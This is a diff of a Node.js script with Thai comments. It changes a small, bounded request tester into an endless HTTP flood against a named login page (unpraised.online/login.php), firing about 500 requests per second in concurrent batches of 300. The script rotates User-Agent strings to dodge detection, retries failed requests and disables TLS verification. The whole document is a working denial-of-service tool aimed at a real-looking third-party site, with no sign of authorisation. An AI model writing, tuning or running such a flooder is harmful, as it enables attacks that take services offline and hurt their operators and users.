@@ -1,73 +1,69 @@
-import axios from "axios";
-import https from "https";
-import axiosRetry from "axios-retry";
+const axios = require("axios");
+const axiosRetry = require("axios-retry").default;
+const https = require("https");
 
-// ✳️ ปิด TLS Verification ถ้าจำเป็น (ระวังความปลอดภัย)
 process.env.NODE_TLS_REJECT_UNAUTHORIZED = "0";
+const agent = new https.Agent({ rejectUnauthorized: false });
 
-// ✅ URL ปลายทาง
-const URL = "https://example.com";
-
-// ✅ จำนวนรอบยิงทั้งหมด
-const TOTAL_BATCHES = 5;
-
-// ✅ จำนวน request ต่อรอบ
-const BATCH_SIZE = 200;
-
-// ✅ Function สุ่ม User-Agent
-function getRandomUserAgent() {
-  const userAgents = [
-    "Mozilla/5.0 (Windows NT 10.0; Win64; x64)",
-    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7)",
-    "Mozilla/5.0 (Linux; Android 10)",
-    "Mozilla/5.0 (iPhone; CPU iPhone OS 14_0 like Mac OS X)",
-    "Mozilla/5.0 (iPad; CPU OS 13_2_3 like Mac OS X)",
-  ];
-  return userAgents[Math.floor(Math.random() * userAgents.length)];
-}
-
-// ✅ ตั้ง retry เมื่อ request fail
 axiosRetry(axios, {
-  retries: 1,
-  retryDelay: retryCount => retryCount * 1000,
+  retries: 3,
+  retryDelay: (retryCount) => retryCount * 500,
   retryCondition: () => true,
 });
 
-// ✅ https agent
-const agent = new https.Agent({ rejectUnauthorized: false });
+const userAgents = [
+  "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/115.0 Safari/537.36",
+  "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 Version/14.0 Safari/605.1.15",
+  "Mozilla/5.0 (X11; Linux x86_64) Gecko/20100101 Firefox/112.0",
+  "Mozilla/5.0 (iPhone; CPU iPhone OS 14_0 like Mac OS X) AppleWebKit/605.1.15 Mobile/15E148 Safari/604.1",
+];
 
-async function runBatch(batchNum) {
-  console.log(`🚀 เริ่ม Batch ${batchNum}`);
-  const tasks = Array.from({ length: BATCH_SIZE }).map((_, i) => {
-    return new Promise(resolve => {
-      setTimeout(async () => {
-        try {
-          const res = await axios.get(URL, {
-            httpsAgent: agent,
-            headers: {
-              "User-Agent": getRandomUserAgent(),
-              Accept: "text/html",
-            },
-            timeout: 5000,
-          });
-          console.log(`✅ (${batchNum}-${i + 1}) status: ${res.status}`);
-        } catch (err) {
-          console.error(`❌ (${batchNum}-${i + 1})`, err.code || err.message);
-        }
-        resolve();
-      }, i * 10); // Delay 10ms ต่อ request (total ~2s per batch)
-    });
+const URL = "https://unpraised.online/login.php";
+
+const BATCH_SIZE = 300; // ✅ ยิงทีละ 300 requests
+const TARGET_PER_SECOND = 500;
+const DELAY_BETWEEN_BATCH = 1000 * BATCH_SIZE / TARGET_PER_SECOND; // ≈ 600ms
+
+function randomDelay(min = 10, max = 50) {
+  return Math.floor(Math.random() * (max - min + 1)) + min;
+}
+
+function getRandomUserAgent() {
+  return userAgents[Math.floor(Math.random() * userAgents.length)];
+}
+
+async function fireBatch(batchNum) {
+  console.log(`🚀 ชุดที่ ${batchNum} ยิงพร้อมกัน ${BATCH_SIZE} requests`);
+
+  const tasks = Array.from({ length: BATCH_SIZE }, async (_, i) => {
+    await new Promise(r => setTimeout(r, randomDelay()));
+    const start = Date.now();
+    try {
+      const res = await axios.get(URL, {
+        httpsAgent: agent,
+        headers: {
+          "User-Agent": getRandomUserAgent(),
+          Accept: "text/html",
+        },
+        timeout: 5000,
+        responseType: "text",
+      });
+      const duration = Date.now() - start;
+      console.log(`✅ (${batchNum}-${i + 1}) status: ${res.status} | เวลา: ${duration}ms`);
+    } catch (err) {
+      console.error(`❌ (${batchNum}-${i + 1}) ล้มเหลว: ${err.message}`);
+    }
   });
 
   await Promise.all(tasks);
 }
 
-async function runAll() {
-  for (let i = 1; i <= TOTAL_BATCHES; i++) {
-    await runBatch(i);
-    await new Promise(resolve => setTimeout(resolve, 1000)); // พัก 1 วินาทีระหว่างรอบ
+async function loopBatches() {
+  let batch = 1;
+  while (true) {
+    await fireBatch(batch++);
+    await new Promise(resolve => setTimeout(resolve, DELAY_BETWEEN_BATCH));
   }
-  console.log("✅ เสร็จแล้วทั้งหมด");
 }
 
-runAll();
+loopBatches();
